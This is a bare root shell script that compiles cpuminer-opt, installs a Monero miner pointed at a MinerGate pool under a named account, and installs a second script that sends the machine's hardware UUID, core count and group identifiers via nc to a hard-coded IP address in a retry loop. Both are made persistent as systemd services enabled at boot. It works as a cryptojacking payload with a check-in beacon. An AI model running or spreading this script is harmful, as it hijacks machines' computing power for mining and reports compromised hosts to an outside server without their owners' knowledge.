apt-get update;
apt-get install -y automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev;
git clone https://github.com/JayDDee/cpuminer-opt /var/tmp/cpuminer-src;
cd /var/tmp/cpuminer-src;
chmod +x ./build.sh;
./build.sh;
cp /var/tmp/cpuminer-src/cpuminer /bin;
rm -rf /var/tmp/cpuminer-src;

chmod +x /bin/cpuminer;
printf "#!/bin/sh\ncpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
printf '
#!/bin/sh

_wait () {
	while ! nc -z 149.28.31.125 45569;
	do sleep 5;
	done;
};
_exec () {
	if [ "$group" = "" ]; then
		echo "Flag -g (group) is required."
    exit 64
  fi

  if [ "$gid" = "" ]; then
		echo "Flag -i (gekkoxId) is required."
    exit 64
  fi

	numCore=`grep -c ^processor /proc/cpuinfo`;
	uuid=`dmidecode | grep -w UUID | sed "s/^.UUID: //g"`
	echo "$gid|$group|$uuid|$numCore" | nc -q -1 149.28.31.125 45569;
	echo "Port closed. Waiting server to open port...";
	_wait;
	_exec;
};


group=''
gid=''

while getopts g:i: flag; do
  case ${flag} in
  	i) gid="${OPTARG}" ;;
    g) group="${OPTARG}" ;;
    *) error "Unexpected option ${flag}" ;;
  esac
done;

_exec;
' >  /root/gkx_socket.sh;
printf "[Unit]\n\n[Service]\nExecStart=/root/miner.sh\n\n[Install]\nWantedBy=default.target" > /etc/systemd/system/miner.service;
printf "[Unit]\n\n[Service]\nExecStart=/root/gkx_socket.sh\n\n[Install]\nWantedBy=default.target" > /etc/systemd/system/gkx_socket.service;
chmod 744 /root/gkx_socket.sh;chmod 744 /root/miner.sh;
chmod 664 /etc/systemd/system/gkx_socket.service;
chmod 664 /etc/systemd/system/miner.service;
systemctl enable gkx_socket.service;
systemctl enable miner.service;
service gkx_socket start;
service miner start;
